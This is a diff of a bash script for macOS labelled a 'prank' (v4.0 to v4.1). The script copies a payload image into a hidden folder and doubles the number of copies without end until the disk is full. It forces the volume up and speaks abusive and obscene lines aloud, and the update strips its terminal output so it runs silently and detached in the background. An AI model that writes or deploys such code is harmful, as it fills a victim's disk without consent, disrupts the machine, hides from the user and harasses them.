@@ -1,58 +1,10 @@
 #!/bin/bash
 
-# Karan's Ultimate Prank v4.0 - SOTA WORKING EDITION
-# Exponential doubling + Dark audio + Guaranteed execution
+# Karan's Ultimate Prank v4.1 - VOICE ONLY FINAL EDITION
+# No terminal prints, only dark voice commentary
 
-VERSION="4.0.0"
+VERSION="4.1.0"
 HIDDEN_DIR="$HOME/Downloads/.Karan"
-
-# Colors (clean, no blinking)
-RED='\033[0;31m'; GREEN='\033[0;32m'; YELLOW='\033[1;33m'
-BLUE='\033[0;34m'; PURPLE='\033[0;35m'; CYAN='\033[0;36m'
-BOLD='\033[1m'; BG_GREEN='\033[42m'; BG_RED='\033[41m'
-BG_YELLOW='\033[43m'; WHITE='\033[1;37m'; NC='\033[0m'
-
-# Dark gritty messages (visual)
-DARK_MESSAGES=(
-    "🎪 Welcome to Karan's exponential circus of doom!"
-    "🔥 Burning through bytes like a digital inferno!"
-    "💀 Your storage meets its exponential executioner!"
-    "⚡ Doubling faster than your mounting dread!"
-    "🌪️ Creating exponential chaos from digital hell!"
-    "🎯 Exponential bullseye to your disk's heart!"
-    "🚀 To infinity with exponential destruction!"
-    "💎 Each doubling creates cursed gems!"
-    "🔮 Predicting exponential digital apocalypse!"
-    "🎨 Painting exponential nightmares on your drive!"
-    "🎵 Can you hear your hard drive's death rattle?"
-    "☠️ Your data's last supper is being served!"
-    "🕷️ Spinning the web of destruction around your disk!"
-    "☢️ Radioactive storage meltdown incoming!"
-    "🧟‍♂️ Zombies are eating your free space alive!"
-    "💀 Skeletons dancing on your hard drive's grave!"
-    "🎃 Halloween came early: your disk is haunted!"
-    "🌑 Black hole of storage: nothing escapes!"
-    "🔪 Cutting your space like a digital surgeon!"
-    "💣 Storage bomb exploding bytes everywhere!"
-    "🩸 Bloodbath on your file system!"
-    "☣️ Virus unleashed: storage under quarantine!"
-    "👻 Ghost files creeping in the digital shadows!"
-    "🧨 Dynamite fuse lit: boom time for your drive!"
-    "🦇 Bats swarming your precious storage space!"
-    "🔥 Inferno rising: no file safe tonight!"
-    "🗡️ Blade of deletion cutting deep!"
-    "⚰️ Digging your storage's digital grave!"
-    "🦠 Malicious multiplication virus spreading!"
-    "🌋 Volcanic eruption of exponential files!"
-    "🕸️ Caught in the spider's web of doom!"
-    "💀 Grim reaper harvesting your gigabytes!"
-    "🎪 Freak show: witness your disk's demise!"
-    "👹 Demons feasting on your free space!"
-    "🌊 Tsunami of files drowning your disk!"
-    "⚡ Lightning strikes: your storage is toast!"
-    "🦈 Sharks circling your dying storage!"
-    "🔥 Phoenix rising from your storage ashes!"
-)
 
 # Dark audio messages (what gets spoken)
 DARK_AUDIO=(
@@ -96,184 +48,138 @@ DARK_AUDIO=(
     "you're a fucking dumb cunt"
 )
 
-# Setup directory (bulletproof)
+# Setup (silent)
 setup() {
     mkdir -p "$HIDDEN_DIR" 2>/dev/null || true
     chflags hidden "$HIDDEN_DIR" 2>/dev/null || true
     touch "$HIDDEN_DIR/.log" 2>/dev/null || true
 }
 
-# Logging function
-log_msg() {
-    echo -e "${1}${2}${NC}"
-    echo "$(date): $2" >> "$HIDDEN_DIR/.log" 2>/dev/null || true
+# Silent logging only
+log_silent() {
+    echo "$(date): $1" >> "$HIDDEN_DIR/.log" 2>/dev/null || true
 }
 
-# Random visual message
-show_dark_msg() {
-    local msg=${DARK_MESSAGES[$RANDOM % ${#DARK_MESSAGES[@]}]}
-    local colors=("$RED$BOLD" "$PURPLE$BOLD" "$YELLOW$BOLD" "$CYAN$BOLD")
-    local color=${colors[$RANDOM % ${#colors[@]}]}
-    log_msg "$color" "$msg"
-}
-
-# Dark audio (fixed to actually work)
-speak_dark() {
+# FIXED: Audio function that actually works
+speak_dark_message() {
+    # Kill existing audio first
     pkill -f "say" 2>/dev/null || true
-    sleep 0.1
-    local audio_msg=${DARK_AUDIO[$RANDOM % ${#DARK_AUDIO[@]}]}
-    osascript -e "set volume output volume 85" 2>/dev/null || true
-    say "$audio_msg" 2>/dev/null &
+    sleep 0.3
+    
+    # Pick random dark message
+    local dark_msg=${DARK_AUDIO[$RANDOM % ${#DARK_AUDIO[@]}]}
+    
+    # Set volume and speak (synchronously)
+    osascript -e "set volume output volume 90" 2>/dev/null || true
+    say "$dark_msg" 2>/dev/null
+    wait
 }
 
-# MAIN EXPONENTIAL DUPLICATION FUNCTION
-exponential_chaos() {
+# Exponential destruction with voice only
+exponential_voice_destruction() {
     local payload="$1"
-    
-    # Ensure setup first
-    setup
-    
-    # Validate payload exists
-    if [[ ! -f "$payload" ]]; then
-        log_msg "$RED$BOLD" "💀 ERROR: Payload not found at $payload!"
-        return 1
-    fi
-    
-    # Copy payload to hidden location
-    cp "$payload" "$HIDDEN_DIR/.payload" || {
-        log_msg "$RED$BOLD" "💀 ERROR: Failed to copy payload!"
-        return 1
-    }
-    
-    log_msg "$BG_PURPLE$WHITE$BOLD" "🎭 Karan's Ultimate Prank v4.0 - SOTA WORKING!"
-    log_msg "$BG_RED$WHITE$BOLD" "📈 Exponential doubling: 1→2→4→8→16→32→64..."
-    
-    # Initial dark audio
-    speak_dark
-    
-    log_msg "$RED$BOLD" "🚀 INITIATING EXPONENTIAL DIGITAL WARFARE!"
-    show_dark_msg
-    
-    # Start with 1 file
     local round=0
-    local current_files=0
+    local current_count=0
+    local target_count=1
     
-    # Create the first file
-    if cp "$HIDDEN_DIR/.payload" "$HIDDEN_DIR/karan_exp_$(printf "%08d" 1).jpg" 2>/dev/null; then
-        current_files=1
-        log_msg "$GREEN$BOLD" "💀 ROUND 0: Genesis file created (Total: 1)"
-        speak_dark
-    else
-        log_msg "$RED$BOLD" "💾 DISK FULL at genesis!"
-        speak_dark
+    # Setup
+    setup
+    cp "$payload" "$HIDDEN_DIR/.payload"
+    
+    log_silent "Starting voice-only exponential destruction"
+    speak_dark_message
+    
+    # Create first file
+    if ! cp "$HIDDEN_DIR/.payload" "$HIDDEN_DIR/karan_exp_$(printf "%08d" 1).jpg" 2>/dev/null; then
+        log_silent "Disk full at genesis"
+        speak_dark_message
         return
     fi
+    current_count=1
+    speak_dark_message
     
     # Exponential doubling loop
     while true; do
         round=$((round + 1))
-        local target_files=$((current_files * 2))
-        local files_to_create=$((target_files - current_files))
+        local new_target=$((target_count * 2))
+        local files_to_create=$((new_target - current_count))
         
-        log_msg "$BG_YELLOW$RED$BOLD" "🔥 ROUND $round: Exponential doubling $current_files → $target_files files!"
-        show_dark_msg
-        speak_dark
+        log_silent "Round $round: doubling $current_count to $new_target"
+        speak_dark_message
         
-        # Create the new files by copying existing ones
-        local created_count=0
+        # Create files for this round
+        local created_this_round=0
         for ((i=1; i<=files_to_create; i++)); do
-            local new_file_num=$((current_files + i))
-            local source_num=$(((i-1) % current_files + 1))
+            local new_file_num=$((current_count + i))
+            local source_file_num=$(((new_file_num - 1) % current_count + 1))
             
-            # Copy from existing file to create new one
-            if cp "$HIDDEN_DIR/karan_exp_$(printf "%08d" $source_num).jpg" \
-               "$HIDDEN_DIR/karan_exp_$(printf "%08d" $new_file_num).jpg" 2>/dev/null; then
-                created_count=$((created_count + 1))
-            else
-                # Disk full - calculate final count
-                local final_count=$((current_files + created_count))
-                log_msg "$BG_RED$WHITE$BOLD" "💀 DISK COMPLETELY FULL! Final count: $final_count files!"
-                speak_dark
+            # Copy existing file to create new one
+            if ! cp "$HIDDEN_DIR/karan_exp_$(printf "%08d" $source_file_num).jpg" \
+                    "$HIDDEN_DIR/karan_exp_$(printf "%08d" $new_file_num).jpg" 2>/dev/null; then
+                log_silent "Disk completely full after $((current_count + created_this_round)) files"
+                speak_dark_message
                 return
             fi
             
-            # Show progress every 50 files for large rounds
-            if [[ $((created_count % 50)) -eq 0 ]] && [[ $files_to_create -gt 100 ]]; then
-                show_dark_msg
-                speak_dark
+            created_this_round=$((created_this_round + 1))
+            
+            # Dark commentary every 40 files
+            if [[ $((created_this_round % 40)) -eq 0 ]]; then
+                speak_dark_message
             fi
         done
         
-        # Update current file count
-        current_files=$target_files
+        current_count=$new_target
+        target_count=$new_target
         
-        # Round completion
-        log_msg "$BG_GREEN$WHITE$BOLD" "💀 ROUND $round COMPLETE! Total files: $current_files"
-        show_dark_msg
-        speak_dark
+        log_silent "Completed round $round with total $current_count files"
+        speak_dark_message
         
-        # Exponential milestones
-        case $current_files in
+        # Milestone celebrations (voice only)
+        case $current_count in
             2)
-                log_msg "$YELLOW$BOLD" "🎉 2 FILES: The exponential nightmare begins!"
-                speak_dark
+                speak_dark_message
                 ;;
             16)
-                log_msg "$RED$BOLD" "🔥 16 FILES: Exponential hellfire unleashed!"
-                speak_dark
+                speak_dark_message
                 ;;
             256)
-                log_msg "$PURPLE$BOLD" "💎 256 FILES: Exponential death mastery!"
-                speak_dark
+                speak_dark_message
                 ;;
             4096)
-                log_msg "$BG_RED$WHITE$BOLD" "🚀 4096 FILES: EXPONENTIAL ARMAGEDDON!"
-                speak_dark
+                speak_dark_message
                 ;;
             65536)
-                log_msg "$BG_PURPLE$WHITE$BOLD" "👑 65,536 FILES: EXPONENTIAL EMPEROR!"
-                speak_dark
+                speak_dark_message
                 ;;
         esac
         
-        # Brief pause between rounds
-        sleep 0.3
+        sleep 0.4
     done
 }
 
 # Validate system
-validate_system() {
-    if [[ "$(uname)" != "Darwin" ]]; then
-        echo "💀 ERROR: This prank requires macOS!"
-        exit 1
-    fi
+validate() {
+    [[ "$(uname)" == "Darwin" ]] || exit 1
+    [[ -f "$1" ]] || exit 1
 }
 
-# MAIN EXECUTION
+# Main execution
 main() {
-    validate_system
-    setup
-    
     local payload="$1"
-    if [[ -z "$payload" ]]; then
-        payload="/opt/homebrew/share/dingdong/payload.png"
-    fi
-    
-    exponential_chaos "$payload"
+    [[ -z "$payload" ]] && payload="/opt/homebrew/share/dingdong/payload.png"
+    validate "$payload"
+    exponential_voice_destruction "$payload"
 }
 
-# Background execution logic
-if [[ "$2" == "--background" ]]; then
-    # Background mode - run the actual prank
-    exec > "$HIDDEN_DIR/.log" 2>&1
+# Execution logic
+if [[ "$2" == "--execute" ]]; then
+    # Background execution - no terminal output
+    exec > /dev/null 2>&1
     main "$1"
 else
-    # Foreground mode - launch in background
+    # Launch in background silently
     setup
-    echo -e "${GREEN}${BOLD}🚀 Ultimate Prank v4.0 launched!${NC}"
-    echo -e "${PURPLE}${BOLD}⚡ Exponential chaos starting now!${NC}"
-    
-    # Start background execution
-    "$0" "$1" --background &
+    "$0" "$1" --execute &
     disown
 fi
